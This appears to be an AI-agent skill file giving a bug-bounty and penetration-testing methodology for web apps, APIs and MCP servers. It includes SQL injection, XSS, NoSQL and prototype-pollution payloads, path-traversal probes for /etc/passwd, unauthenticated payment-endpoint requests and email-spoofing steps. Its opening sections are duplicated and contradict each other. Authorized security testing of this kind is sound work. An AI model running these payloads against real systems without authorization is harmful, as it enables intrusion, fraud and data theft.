---
name: offensive-security
description: "Offensive security methodology — unified umbrella for web app bug bounty hunting, smart contract audits (EVM/Solana, Move/Aptos, TRON), request smuggling/desync specialist, source code auditing, ML model/server security testing, and threat intelligence monitoring. Load this first for any offensive security task; it routes to labeled subsections and reference files for specialized workflows."
version: 1.10.0
author: bx0
license: MIT
platforms: [linux, macos]
metadata:
  hermes:
    tags: [offensive-security, red-team, bug-bounty, code-audit, ml-security, threat-intel, pentest, recon]
---

# Offensive Security — Unified Methodology

End-to-end offensive security workflow covering web application testing, source code auditing, ML model/server security, and threat intelligence monitoring.

**How this skill is organized:**
This is an umbrella skill. Load this first for any offensive security work. Use the labeled subsections below for the specific phase you're in. Detailed reference files and scripts are in `references/` and `scripts/` (access via `skill_view(name='offensive-security', file_path='...')`).

---

## 0 — Operational Security (READ FIRST)

**Before touching any target infrastructure (criminal or pentest):**

### 0.1 — Never Create Accounts on Pentest Targets

- **NEVER** create accounts on pentest/bug bounty targets unless explicitly authorized
- Creating accounts leaves traces, triggers alerts, and may violate scope rules
## 0 — Operational Security (READ FIRST)

**Before touching any attacker/criminal infrastructure:**

### 0.1 — Never Use Identifiable Information

- **NEVER** create accounts with usernames that identify you or your organization
- **NEVER** use your real name, handle, or any identifiable pattern
- Criminal operators monitor their own dashboards — new accounts are visible in logs
- If they see "<operator-handle>" they know someone named bx0 is investigating them
- This can trigger evidence destruction, legal threats, or physical danger
- **If you must create an account**: use a generic name that blends in (e.g., "user2025")
- **Better**: don't create accounts at all — use unauthenticated attack vectors first
- **If you accidentally created identifiable accounts**: prioritize cleanup IMMEDIATELY
- Accept that some accounts may be impossible to delete without admin access

### 0.1.1 — No Account Creation During Pentests (User Preference)

**When the user explicitly says "don't create accounts" or similar:**
- Respect this constraint absolutely — do not register accounts on any target system
- Focus on unauthenticated attack vectors: information disclosure, CORS, IDOR, SQLi, auth bypass
- If a finding requires authenticated testing, document it as a potential finding and ask the user before proceeding
- This is common in pentests where the client doesn't want test accounts cluttering their system
- **Signal phrases:** "don't create accounts", "no account creation", "just don't go around creating accounts"

### 0.2 — Multi-App Server Awareness

When investigating a server hosting multiple applications on different ports:
1. **Map the full infrastructure first** before touching anything
2. **Identify which apps share databases** — they might not
3. **Understand auth mechanisms separately** — different apps = different JWT secrets, different user tables
4. **Don't assume one app's compromise gives access to another**
5. **Be aware of noise** — actions on one app might trigger alerts visible to the attacker in another

See `references/ops-criminal-infrastructure.md` for the full lesson learned the hard way.

---

## A — Web App Bug Bounty Hunting

Full methodology for finding and reporting vulnerabilities in web application bug bounty programs.

**When:** Hunting on HackerOne/Bugcrowd/Intigriti, testing a target app, planning recon, writing reports.

**Core principle:** Out-think, don't out-race. Speed hunters pile into obvious endpoints. Find the leftovers: legacy API versions, import/export features, integration points, business logic that scanners miss.

### A.1 — Hunt Workspace

```
docs/ABOUT.md    # Program policy, disclosure rules
docs/SCOPE.md    # In-scope domains (markdown table)
HUNT.md           # Running log of every action + result
vuln/             # One file per confirmed finding
```

See `references/wordlists.md` for subdomain/API wordlists and content discovery lists.

### A.5 — Email Security Assessment (SPF/DMARC)

**When:** Testing a target's email domain security. Check DNS for SPF, DKIM, and DMARC records. If missing or misconfigured, send a spoofed email to prove the gap.

See `references/email-spoofing-testing.md` for the full workflow including swaks commands, MX server selection, and provider-specific behavior.

### A.2 — Reverse-Engineering Frontend JS for API Discovery

**When:** The target's SPA (React, Next.js, Vue) reveals a login/auth form, but direct API calls fail with validation errors. The browser automation (Playwright/Puppeteer) is being detected and pages go blank. Solution: extract the exact request format from the frontend JS bundle and call the API directly.

#### A.2.1 — Finding the JS Bundle

```bash
# Get the main HTML — look for <script src="/assets/index-*.js">
curl -s "https://app.target.com/login" | grep -o 'src="[^"]*\.js[^"]*"'

# Download the bundle (may be large, 500KB+)
curl -s "https://app.target.com/assets/index-hnouDE93.js" -o bundle.js
```

#### A.2.2 — Extracting API Request Formats

Search for the authentication API call pattern in the minified JS. The bundle is typically ES module format with `import`/`export`, so strings are often preserved verbatim.

**Target patterns:**
```bash
# Find login-related API calls — look for provider/code/otp patterns
grep -o '.{0,100}login.{0,100}' bundle.js | grep -i 'provider\|email\|otp\|session'

# Look for the mutation function — often uses .post() with an object
grep -o '.{0,50}\.post({[^}]*[Ee][Mm][Aa][Ii][Ll].*' bundle.js
```

**Known format patterns found in real targets:**
- `{provider:"EMAIL", email: "...", state: "..."}` — state is often `btoa(JSON.stringify(deviceInfo))`
- `{session: "...", otp: "..."}` — session returned from first call, otp = 8-char verification code
- `{provider:"GOOGLE", code: "...", state: "..."}` — OAuth callback format

#### A.2.3 — Understanding the `state` / Device Fingerprint

Modern SPAs generate a device fingerprint as a CSRF-like state parameter. Extract how it's generated:

```bash
# Search for btoa/JSON.stringify/device fingerprint patterns
grep -o '.{0,200}state.{0,200}' bundle.js | head -5

# Common pattern:
# state = btoa(JSON.stringify({ip, name, os, kind}))
```

The state is typically `base64(JSON.stringify(deviceInfo))` where deviceInfo includes:
- `ip` — often "127.0.0.1" or collected from browser
- `name` — browser name ("Chrome")
- `os` — operating system ("macOS", "Linux")
- `kind` — device type ("browser")
- `inviteCode` — optional, from URL parameter

Generate a valid state:
```python
import json, base64
device = {'ip': '127.0.0.1', 'name': 'Chrome', 'os': 'macOS', 'kind': 'browser'}
state = base64.b64encode(json.dumps(device).encode()).decode()
```

#### A.2.4 — Complete Login Flow via Direct API

```bash
# Step 1: Send email login request
RESP=$(curl -s -X POST "https://api.target.com/app/account/login" \
  -H "Content-Type: application/json" \
  -d '{"provider":"EMAIL","email":"user@target.com","state":"<BASE64_DEVICE>"}')
SESSION=$(echo "$RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['session'])" 2>/dev/null)

# Step 2: User provides OTP from email
curl -s -X POST "https://api.target.com/app/account/login/email/verify" \
  -H "Content-Type: application/json" \
  -d "{\"session\":\"$SESSION\",\"otp\":\"$OTP\"}"

# Response includes: token (JWT/session token), account (user object), newUser (boolean)
```

**Pitfall:** Each call to `/app/account/login` sends a NEW code to the email. Don't call step 1 again until the user confirms the old code is expired, or you'll invalidate the code they already have.

**Pitfall:** The response schema may differ from the JS extraction — the JS bundle shows `.data.data?.session` but the actual HTTP response may use different JSON nesting. Check the raw response with `tee` or `cat -v`.

**Pitfall:** When the browser automation is detected (empty page, `about:blank`, anti-bot screen), switch to direct API calls immediately. Don't keep refreshing the browser — the detection persists across navigations. The signal is definitive: if you get an empty/null snapshot after a `browser_navigate` that previously showed a login form, the automation was detected.

**Pitfall:** Some endpoints use Elysia-style union validation (e.g., `"Value should be one of 'object', 'object'"`). This means the endpoint accepts multiple body shapes — find which one the frontend actually sends, not just the OpenAPI spec. This error is a strong signal to switch to JS bundle analysis rather than guessing body formats.

#### A.2.6 — JS Bundle Mining for Undocumented Endpoint Discovery

**When:** The public OpenAPI spec doesn't cover all endpoints, or you need to find hidden/undocumented API routes. The SPA's minified JS bundle contains every endpoint the frontend can call — often 3-5x more than the public spec.

**Technique:**

```bash
# 1. Find the JS bundle
curl -s "https://app.target.com" | grep -o 'src="[^"]*\.js[^"]*"' | head -5

# 2. Download (can be 1-5MB)
curl -s "https://app.target.com/assets/index-HASH.js" -o bundle.js

# 3. Extract ALL API endpoints
grep -oP '["\x60](/app/[^\"\\\\x60]{3,80})[\"\\x60]' bundle.js | sort -u
grep -oP '["\x60](/v[0-9]+/[^\"\\\\x60]{3,80})[\"\\x60]' bundle.js | sort -u
grep -oP '["\x60](/internal/[^\"\\\\x60]{3,80})[\"\\x60]' bundle.js | sort -u

# 4. Extract auth patterns
grep -o '.{0,100}Authorization.{0,100}' bundle.js | grep -i 'bearer\|token\|header' | head -10
grep -o '.{0,100}localStorage.{0,100}' bundle.js | head -10
grep -o '.{0,100}sessionStorage.{0,100}' bundle.js | head -10

# 5. Find sensitive hardcoded values
grep -oP '["\x60]https?://[^\"\\x60]*(?:api|dash|internal)[^\"\\x60]*[\"\\x60]' bundle.js | sort -u
grep -oP '["\x60][a-f0-9]{24,}[\"\\x60]' bundle.js | head -20  # potential IDs/secrets
```

**What to look for:**
- Undocumented API versions (`/v2/`, `/v3/`) that return 400 (not 404) = live but need different auth
- Internal endpoints (`/internal/`) loaded in client code = accessible from browser
- AI agent endpoints (`/agent/`, `/chat/`, `/conversations/`)
- POS/session management (`/pdv/`, `/sessions/`)
- Export endpoints (`/exports/`) — often scoped only by client-side filters
- Fiscal/KYC endpoints (`/fiscal/`, `/kyc/`) — may have different auth models
- Feature flags and dev mode endpoints (`/feature-flags`, `/sessions/get-devmode`)
- Group/tenant management (`/groups/`, `/stores/switch`)

**Pitfall (Better Auth):** When the frontend uses Better Auth, the JS bundle won't contain readable API endpoint strings for the application data routes. All data fetching goes through the Better Auth client SDK. To discover the actual data API endpoints:
1. Search the JS bundle for `pluginPathMethods` object — reveals auth endpoints
2. Look for the `baseURL` configuration — reveals the API server
3. Search for fetch/axios calls with path construction patterns
4. Use browser DevTools Network tab after login to capture actual API calls
5. Try common REST patterns on the API server: `GET/POST/PUT/PATCH/DELETE /api/v1/{resource}` and `GET /api/v1/{resource}/{id}`
6. Session cookies are domain-specific — a cookie from `api.example.com` won't work on `admin.example.com`

See `references/better-auth-security-testing.md` for full testing methodology.

**Pitfall:** The bundle may reference development-only endpoints that are stripped in production. Verify each endpoint against the live API before reporting.

**Real-world example (payment-gateway engagement):** Analysis of the 2.8MB bundle revealed 40+ undocumented endpoints including an AI agent chat system (`/app/agent/conversations/*`), POS session management (`/app/pdv/sessions/*`), fiscal certificate upload (`/app/fiscal/*`), KYC resubmission (`/app/kyc/resubmit-*`), and a full `/v2/` API (`/v2/card-payments`, `/v2/pix/send`, `/v2/payouts`) not present in the public OpenAPI spec. The v2 endpoints returned 400 (not 404), confirming they are live with a different auth model.

#### A.2.X — Next.js Server Action Architecture

**When:** The target is a Next.js 14+ app using React Server Components and Server Actions. Detection: no `/api/*` routes on the app subdomain, JS bundles contain `createServerReference` calls.

**Key insight:** Next.js SPAs don't have traditional REST APIs. All mutations go through Server Actions (POST to current page URL with `Next-Action: <action_id>` header). To test these apps:

1. **Find SA IDs from JS bundles:** `grep -oP '"[a-f0-9]{40,}"' bundle.js | sort -u`
2. **Intercept SA calls via browser:** Override `window.fetch` to capture requests with `Next-Action` header
3. **Map internal endpoints:** SA bodies contain `["/v1/endpoint", {method, body}]` — extract the internal API paths
4. **Capture workflow:** Navigate → Set interceptor → Trigger action → Read `window.__saCalls` → Repeat (interceptor is lost on each navigation)

**Pitfall:** When user says "you didn't find anything on the app" — keep looking. Test all input fields for XSS, test all buttons/actions for CSRF/IDOR, check for open redirects in navigation, and look for business logic flaws. The absence of REST APIs doesn't mean the app is secure.

See `references/nextjs-server-action-testing.md` for full methodology and `references/react-spa-xss-testing.md` for XSS testing on React apps.

#### A.2.7 — Better Auth Discovery Pattern

**When:** The target uses Better Auth (common in modern Next.js/Express stacks). Detection signals:
- JS bundle contains `better-auth` string or `better-call:api-error-headers` symbol
- Auth client initialized with `{baseURL: "https://api.target.com"}` pattern
- Imports from `better-auth/client` or `better-auth/react`
- Social provider buttons (Google, GitHub, etc.) without custom OAuth implementation

**Standard Better Auth endpoints to test:**
```
GET  /api/auth/get-session          — Returns session (often 200 with null if not logged in)
POST /api/auth/sign-in/social       — Returns OAuth URL (exposes client_id)
POST /api/auth/sign-in/email        — Email/password login (may be disabled)
POST /api/auth/sign-up/email        — Email/password registration (may be disabled)
GET  /api/auth/callback/:provider   — OAuth callback (302 redirect)
POST /api/auth/sign-out             — Sign out
POST /api/auth/change-email         — Change email (requires auth)
POST /api/auth/change-password      — Change password (requires auth)
POST /api/auth/delete-user          — Delete account (requires auth)
POST /api/auth/update-user          — Update profile (requires auth)
POST /api/auth/revoke-sessions      — Revoke all sessions (requires auth)
POST /api/auth/revoke-other-sessions — Revoke other sessions (requires auth)
GET  /api/auth/verify-email         — Email verification
```

**What to look for:**
1. **Exposed OAuth client_id** — `sign-in/social` returns the Google/GitHub OAuth URL with `client_id` in the redirect. Client IDs are semi-public but confirm the OAuth app identity.
2. **Email/password disabled** — If `sign-in/email` returns `"Email and password is not enabled"`, the app relies solely on social OAuth. This limits the attack surface for credential-based attacks.
3. **get-session returns 200 with null** — Confirms the endpoint exists but no session is active. If it returns user data without a cookie/token, that's an auth bypass.
4. **Inconsistent auth on sub-endpoints** — Some endpoints (like `change-email`) may return 400 (validation before auth) while others return 401. The 400 responses reveal the endpoint exists and what parameters it expects.
5. **API versioning** — Better Auth uses `/api/auth/*` for auth, but the app's business logic API may be at `/api/v1/*` or similar. The auth base URL in the JS bundle reveals the API domain.

**Real-world example (speedrun-platform engagement):** Admin panel at `admin.example-speedrun.tld` uses Better Auth with `baseURL: "https://api.example-speedrun.tld"`. Email/password auth is disabled (only Google OAuth). The JS bundle at `/_next/static/chunks/265-*.js` contained the full Better Auth client initialization. The business API at `api.example-speedrun.tld/api/v1/` had public endpoints (`/events` — unauthenticated) and protected endpoints (`/runs`, `/volunteers` — 401 without auth).

#### A.2.5 — Post-Login Token Extraction

Once verified, the response typically contains:
- `token` — JWT or API token for subsequent authenticated requests
- `account` — user object with account details
- `newUser` — boolean for first-time login

**⚠️ Token location varies:** Some APIs return the token in the JSON response body (e.g., `response.user.token`) rather than in an `Authorization` header. Always inspect the full response body for token fields. If the token contains special shell characters (`$`, `*`, `!`, etc.), write it to a file immediately and read from Python — never assign to a shell variable.

```bash
# Extract token from response body
TOKEN=$(curl -s -X POST "https://api.target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"pass"}' | python3 -c "import json,sys; print(json.load(sys.stdin)['user']['token'])")

# Better: write to file from Python to avoid shell escaping issues
python3 -c "
import json, urllib.request
# ... login request ...
token = parsed['user']['token']
with open('/tmp/token.txt', 'w') as f:
    f.write(token)
"
```

Use the token to access authenticated endpoints:
```bash
curl -s "https://api.target.com/app/api-keys/list" \
  -H "Authorization: Bearer $TOKEN"
```

---

### A.3 — Unauthenticated Internal API Auth Bypass Pattern

**When:** You find an OpenAPI/Swagger spec with `/internal/*` routes (or similar prefix like /admin/, /private/, /system/).

**What to look for:**
- `/internal/*` or similar non-versioned route prefixes in the spec
- Endpoints that return `422 validation` instead of `401` (handler runs before auth = bypass confirmed)
- Coupon/promotion endpoints that return "Cannot apply" vs "Not found" (information disclosure)
- Global (not tenant-scoped) internal endpoints — test cross-tenant visibility

**Pattern seen in a payment-gateway engagement:** CRITICAL auth bypass + cross-account IDOR + business-logic abuse on global, non-tenant-scoped internal endpoints.

**Quick test:**
```bash
# Get the spec (often unauthenticated)
curl -s "https://api.target.com/openapi/json" | jq '.paths | keys[] | select(contains("/internal"))'

# Count internal endpoints
curl -s "https://api.target.com/openapi/json" | jq '[.paths | keys[] | select(contains("/internal"))] | length'

# Test an internal endpoint without any auth — 422 = bypass, 401 = auth works
curl -s -X POST "https://api.target.com/internal/charge/create" \
  -H "Content-Type: application/json" \
  -d '{"paymentMethod":"PIX","billingId":"test","coupons":[],"customer":{"name":"x","cellphone":"x","email":"x","taxId":"x"},"device":{"kind":"browser"}}'

# Coupon enumeration (no auth) — "Cannot apply" = coupon EXISTS globally
curl -s "https://api.target.com/internal/coupon/check?code=ADMIN&url=https://api.target.com/v1/billing/test"
```

**Common internal endpoint patterns to test:**
- `/internal/charge/create` — payment charge creation
- `/internal/charge/simulate` — payment simulation (mark as paid)
- `/internal/coupon/check` — coupon validation (often global, not store-scoped)
- `/internal/boleto/create` — boleto generation
- `/internal/billing/get` — billing detail retrieval
- `/internal/cloudflare-worker/tokenizer/*` — token storage (often silently accepts)

**Pitfall:** Coupon validation endpoints may be global across ALL tenants. Create a coupon via your authenticated API, then check it via the unauthenticated internal endpoint to confirm global visibility.

**Pitfall:** Rate limiting (Cloudflare) may kick in after ~30 rapid requests to `/internal/*` endpoints. Add delays between requests.

**Pitfall:** When testing payment bypass, check if the environment is sandbox/devMode. Sandbox may have relaxed auth. Confirm by checking if the same OpenAPI spec (with no auth on internal routes) serves production.

**Pitfall:** Rate limiting (Cloudflare) may kick in after ~30 rapid requests to `/internal/*` endpoints. Add delays between requests.

**Pitfall (auth method):** APIs may accept multiple auth methods — try `Authorization: Bearer *** AND `Cookie: auth-token=<token>`. Cookie-based auth may fail while Bearer succeeds, or vice versa. Test both when getting "Unauthorized". The frontend SPA may use one method but the API backend accepts another.

#### A.3.1 — Cloud Function Auth & Input Validation Testing

**When:** Testing Firebase/GCP cloud functions extracted from mobile apps or JS bundles.

**Auth testing pattern (apply to every function):**
```python
# Step 1: Baseline — no auth
POST /{function} {"test": true}
# 200/404 = no auth needed (HIGH VALUE), 400/401 = needs auth

# Step 2: With fake token
POST /{function} Authorization: Bearer *** {}
# 401 = proper auth check, 400 = auth not enforced

# Step 3: Systematic input validation
payloads = {
    "nosql":     [{"field": {"$gt": ""}}],
    "injection": [{"field": "' OR '1'='1"}],
    "xss":       [{"field": "<script>alert(1)</script>"}],
    "overflow":  [{"field": "a" * 10000}],
    "proto":     [{"__proto__": {"isAdmin": True}}],
}
```

**Document:** Which functions have no auth (highest value), which accept extra parameters without validation, which have loose type checking (e.g., accepting any integer for a count field).

**Real-world example (fitness app):** Only 1 of 22 cloud functions (`storeInstallFingerprint`) was unauthenticated. It accepted arbitrary extra parameters and any integer for `count` (including negative numbers and 99999999999999). All other functions returned 400 without auth.

### A.2.10 — React SPA API Endpoint Extraction

**When:** The target is a React/Next.js/Vue SPA where all routes return the same shell HTML and the real API calls are buried in minified JS bundles.

**Key insight:** SPAs don't have traditional server-rendered pages. All routing is client-side. The API endpoints are in the JS bundles, not in HTML source or server routes.

**Technique:**

```bash
# 1. Get the main HTML and find JS bundle URLs
curl -s "https://app.target.com/" | grep -oE '(?:src|href)="[^"]*\.js[^"]*"' | head -10

# 2. Download the main bundle (can be 500KB-5MB)
curl -s "https://app.target.com/assets/main-HASH.js" -o bundle.js

# 3. Extract API base URL construction
grep -oE 'baseURL["\s:=]+["\x60][^"\x60]+["\x60]' bundle.js
grep -oE 'window\.location[^;]+' bundle.js | head -5

# 4. Extract ALL API paths
grep -oE '"/api/[^"]*"' bundle.js | sort -u
grep -oE '"/auth/[^"]*"' bundle.js | sort -u

# 5. Extract HTTP method calls with paths
grep -oE '(?:fetch|axios|http|request|get|post|put|delete|patch)\s*\(\s*["\x60](/[a-zA-Z0-9/_.-]{3,80})["\x60]' bundle.js | sort -u

# 6. Extract auth patterns (token handling, headers)
grep -oE 'Authorization[^"\\]*' bundle.js | head -5
grep -oE 'Bearer\s+[^"\\]*' bundle.js | head -5
grep -oE 'X-Session-Id[^"\\]*' bundle.js | head -5

# 7. Check for hardcoded secrets (API keys, JWT secrets)
grep -oE '(?:apiKey|api_key|JWT_SECRET|secret)["\s:=]+["\x60][a-zA-Z0-9]{16,}["\x60]' bundle.js

# 8. Check for WebSocket connections
grep -oE 'wss?://[^"'\''\\x60<>\s]+' bundle.js | sort -u
grep -oE 'socket[^"]*["\x60][^"\x60]+["\x60]' bundle.js | head -5
```

**Real-world examples:**
- **Atendimento membership-org (2026-06):** 2.6MB bundle, 200+ API endpoints extracted. Base URL: `https://helpdesk.example-org.tld/api`. Auth: Bearer token in localStorage.
- **crypto-trading SaaS (2026-06):** 1.5MB bundle, 60+ endpoints. Base URL constructed from `window.location.origin`. Auth: Bearer + X-Session-Id headers.
- **ADM membership-org (2026-06):** 684KB bundle. API at separate domain `api.example-org.tld/api`. Only `/api/token` endpoint found.

**Pitfall:** The bundle may be split into multiple chunks (main, vendor, runtime). Check all JS files, not just the main bundle. Use `grep -oE 'src="[^"]*\.js"'` on the HTML to find all bundles.

**Pitfall:** Some bundles use dynamic path construction (e.g., `` `${baseURL}/api/${resource}` ``). Look for the `baseURL` variable definition and template literal patterns.

---

#### A.2.7 — Better Auth Framework Detection and Testing

**When:** The target uses Better Auth (detected via JS bundle containing `better-auth`, `better-auth/client`, or session cookie named `__Secure-better-auth.session_token`).

**Indicators in JS bundles:**
- `import { signIn, signOut, useSession } from "better-auth/client"`
- `baseURL: "https://api.target.com"` in Better Auth client config
- Cookie name: `__Secure-better-auth.session_token`
- Session token format: two-part dot-separated string (NOT standard JWT with 3 parts), e.g. `E4QQtsaw6vXYHQarYAYctpNP5sGAy8cs.tqU8k5Dpl0VcN23tlg1H7seExbEpbkj40Nr+BxSVsS8=`

**Standard Better Auth endpoints to test:**
```
POST /api/auth/sign-in/social     — Returns OAuth URL (usually unauthenticated)
POST /api/auth/sign-in/email      — Email/password login (often disabled for OAuth-only)
POST /api/auth/sign-up/email      — Email/password signup (often disabled)
GET  /api/auth/get-session        — Returns session info (null if no cookie)
POST /api/auth/update-user        — Update profile (requires cookie + Origin header)
POST /api/auth/change-email       — Change email (requires cookie + Origin header)
POST /api/auth/change-password    — Change password (requires cookie + Origin header)
POST /api/auth/delete-user        — Delete account (requires cookie + Origin header)
POST /api/auth/revoke-sessions    — Revoke all sessions (requires cookie + Origin header)
POST /api/auth/sign-out           — Sign out (requires cookie + Origin header)
GET  /api/auth/callback/:provider — OAuth callback (redirect)
```

**Key testing notes:**
- Better Auth requires the `Origin` header for state-changing POST endpoints. Without it: `{"message":"Missing or null Origin","code":"MISSING_OR_NULL_ORIGIN"}` (403). Always include `Origin: https://target.com` when testing authenticated endpoints.
- Session token is a two-part dot-separated string (not JWT). The first part is the token ID, the second is the hashed secret.
- The `sign-in/social` endpoint returns a `url` field with the full OAuth URL including `client_id`, `state`, `code_challenge`, and `redirect_uri`. Check if `redirect_uri` can be manipulated (it shouldn't be — should be server-generated).
- When email/password auth is disabled, the API returns: `{"message":"Email and password is not enabled","code":"EMAIL_PASSWORD_DISABLED"}`
- After Google OAuth, the session cookie is set via `Set-Cookie` header. Capture it from browser DevTools → Network tab → any authenticated request → Cookie header.
- Use captured session cookie with curl: `curl -H "Cookie: __Secure-better-auth.session_token=<token>" -H "Origin: https://target.com" https://api.target.com/api/v1/endpoint`

**Pitfall:** Better Auth CORS is strict — the API only returns `access-control-allow-origin` for whitelisted origins. Other origins get a 204 without CORS headers. This is correct behavior, not a misconfiguration.

### A.4 — MCP Server Security Testing

**When:** You find references to "MCP", "Model Context Protocol", or "AI agent integration" in docs, GitHub repos, or blog posts.

MCP servers expose tools via JSON-RPC 2.0 over HTTP. They can contain filesystem/search tools (potential sandbox escape via path traversal) and API proxy tools (potential IDOR/auth bypass on financial operations).

**Quick discovery:**
```bash
# Probe docs MCP (usually no auth)
curl -s -X POST "https://docs.target.com/mcp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'

# Probe prod MCP
curl -s -X POST "https://mcp.target.com/mcp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -H "Authorization: Bearer ***" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
```

**What to check:**
1. Filesystem tools for path traversal (`cat /etc/passwd`, `cat ../../etc/passwd`)
2. API key validation — presence check vs real validation
3. DNS rebinding protection enabled/disabled in source
4. Financial tools (withdrawals, PIX, payouts) for auth bypass
5. Open ports on the MCP subdomain (3000, 8080, 8443 are common)

**Pitfall (docs vs prod MCP):** Docs MCP instances (e.g., Mintlify-hosted) are separate from production MCP servers. The docs MCP usually exposes only search/filesystem tools (no auth required). The production MCP exposes actual payment tools and requires an API key. Don't confuse them — test each independently.

**Pitfall (API key validation):** The MCP middleware may only check that a key is PRESENT, not that it's VALID. A fake key passes the middleware but fails when the tool calls the upstream API. This means you can enumerate tools without a real key, but can't execute them.

See `references/mcp-server-testing.md` for full methodology, response interpretation, and CVEs to check.

---

## A.6 — CORS Analysis Methodology

**When:** Assessing CORS configuration on API endpoints. Not all misconfigurations are equally exploitable — understand browser enforcement before claiming impact.

### A.6.1 — CORS Header Extraction

```bash
# Test preflight response
curl -s -X OPTIONS "https://api.target.com/v1/endpoint" \
  -H "Origin: https://evil-attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization, Content-Type" \
  -D - -o /dev/null

# Test simple response (no preflight)
curl -s "https://api.target.com/v1/endpoint" \
  -H "Origin: https://evil-attacker.com" \
  -D - -o /dev/null
```

Key headers to document:
- `Access-Control-Allow-Origin` (ACAO): `*` = wildcard, `https://specific.com` = restricted
- `Access-Control-Allow-Credentials` (ACAC): `true` = cookies/credentials allowed
- `Access-Control-Expose-Headers` (ACAE): `*` = all headers visible to JS
- `Access-Control-Allow-Methods` (ACAM): which HTTP methods are permitted
- `Access-Control-Allow-Headers` (ACAH): which request headers are permitted
- `Vary: Origin` (missing = CDN may cache CORS response for wrong origin)

### A.6.2 — Browser Enforcement Matrix

| ACAO | ACAC | Browser blocks JS read? | Exploitable? |
|------|------|------------------------|--------------|
| `*` | `true` | **YES** — invalid combo per Fetch spec | Only for non-browser clients (curl, SSRF, mobile WebViews, legacy browsers) |
| `*` | `false` | No (but no credentials sent) | Headers/data readable if endpoint doesn't require auth |
| `https://evil.com` | `true` | **NO** — exact match works | **Full data theft** if attacker controls that origin |
| `https://evil.com` | `false` | No | Limited — can read public responses |
| `null` | `true` | **NO** — null origin accepted | Exploitable via sandboxed iframes |
| Missing | — | Yes by default | Not a CORS issue |

**Critical insight:** `ACAO: *` + `ACAC: true` is the MOST COMMON false positive in CORS testing. Modern browsers **explicitly block** this combination — the Fetch spec says the server must not set ACAO to wildcard when ACAC is true. Browsers will not expose the response to JavaScript.

### A.6.3 — When CORS Misconfig IS Exploitable

1. **ACAO reflects arbitrary Origin** (reflects back whatever Origin header the attacker sends) → full credentialed cross-origin access
2. **ACAO: null** exploitable via sandboxed iframes (`<iframe sandbox="allow-scripts">`)
3. **ACAO with subdomain takeover** — e.g., ACAC trusts `*.target.com` and attacker controls `evil.target.com`
4. **Non-browser clients** — curl, server-side HTTP clients, mobile WebViews (especially Android WebView with relaxed CORS), SSRF chains don't enforce browser CORS
5. **ACAE: *** — even with `*` + `true` blocked, the intent to expose all headers is a defense-in-depth gap

### A.6.4 — Whitelist CORS Pattern (Proper Configuration)

Some APIs implement a CORS whitelist: they check the `Origin` header against an allowlist and only return `access-control-allow-origin` for trusted origins. For non-whitelisted origins, the header is omitted entirely (no CORS headers = browser blocks the response by default).

**How to detect:** Send OPTIONS with various Origin headers:
- Trusted origin (e.g., `https://www.target.com`) → Response includes `access-control-allow-origin: https://www.target.com`
- Untrusted origin (e.g., `https://evil.com`) → Response omits `access-control-allow-origin` entirely
- This is **correct behavior** — not a vulnerability.

**Real-world example (speedrun-platform engagement):** `api.example-speedrun.tld` returns `access-control-allow-origin` only for `www.example-speedrun.tld` and `admin.example-speedrun.tld`. All other origins get no CORS headers. This is a properly configured whitelist.

### A.6.5 — What to Report

| Scenario | Severity | Notes |
|----------|----------|-------|
| ACAO reflects Origin + ACAC: true | **HIGH** | Full cross-origin data theft |
| ACAO: * + ACAC: true | **MEDIUM** | Defense-in-depth failure; exploitable in non-browser clients |
| ACAO: * + token auth (no cookies) | **MEDIUM** | Any origin can call API; defense-in-depth gap |
| ACAE: * without auth requirements | **LOW** | Response headers exposed cross-origin |
| Missing `Vary: Origin` | **LOW** | CDN may cache CORS response for wrong origin |
| ACAM: ALL + ACAH: auth headers | **INFO** | Any origin can send authenticated requests (if token obtained via other means) |
| Whitelist (specific origins only) | **NOT A VULN** | Proper CORS configuration |

**Don't overclaim:** If the API uses token-based auth (`Authorization: Bearer`, `x-api-key`) and not cookie-based auth, pure CORS-based data theft from a browser is limited. A malicious page can make requests but can't read authenticated responses without the token. Frame the impact accordingly.

**Real-world example (payment-gateway engagement):** Both `api.example-pay.tld` and `dash.example-pay.tld` had `ACAO: *` + `ACAC: true` + `ACAE: *`. While modern browsers block credentialed reads, the configuration allowed any origin to make requests with arbitrary methods and headers. The API uses token-based auth (not cookies), limiting browser-based data theft. Severity: MEDIUM (defense-in-depth + non-browser client risk).

**Real-world example (membership-org engagement):** `example-org.tld` WP REST API returns `ACAO: *` reflecting arbitrary origin + `ACAC: true`. Any malicious site can make credentialed cross-origin requests. Combined with user enumeration (5 users via `/wp-json/wp/v2/users`), this enables targeted attacks. Severity: MEDIUM.

### A.2.X — ASP.NET Web API Testing

**When:** Testing ASP.NET / IIS backends (common in institutional/brazilian targets — Masonic lodges, government, education).

**Detection:** Server headers: `Microsoft-IIS/8.0`, `X-AspNet-Version: 4.0.30319`, `X-AspNetMvc-Version: 5.2`. Look for `/api/token`, `/api/values`, `/api/auth` patterns.

**Auth bypass test matrix for ASP.NET token endpoints:**
```bash
# 1. SQL injection (both fields)
curl -X POST "/api/token" -d "username=admin' OR '1'='1'--&password=x"
curl -X POST "/api/token" -d "username=admin&password=' OR '1'='1'--"

# 2. Time-based blind (MSSQL)
curl -X POST "/api/token" -d "username=admin'; WAITFOR DELAY '00:00:05'--&password=x"

# 3. Content-type manipulation
curl -X POST "/api/token" -H "Content-Type: application/json" -d '{"username":"admin","password":"x"}'
curl -X POST "/api/token" -H "Content-Type: text/plain" -d "username=admin&password=x"

# 4. Method override
curl -X POST "/api/token" -H "X-HTTP-Method-Override: GET" -d "..."
curl -X GET "/api/token?username=admin&password=x"

# 5. Internal IP bypass headers
curl -X POST "/api/token" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -d "..."
```

**User enumeration via error messages:** Compare responses for valid vs invalid usernames. ASP.NET apps often return different messages like "Usuário ou senha inválidos" (both wrong) vs "Informe o usuário" (empty field). Same error for valid user + wrong password vs invalid user = no enumeration.

**IIS version disclosure:** Always check Server headers. IIS 8.0 = Windows Server 2012 (EOL). Document as INFO.

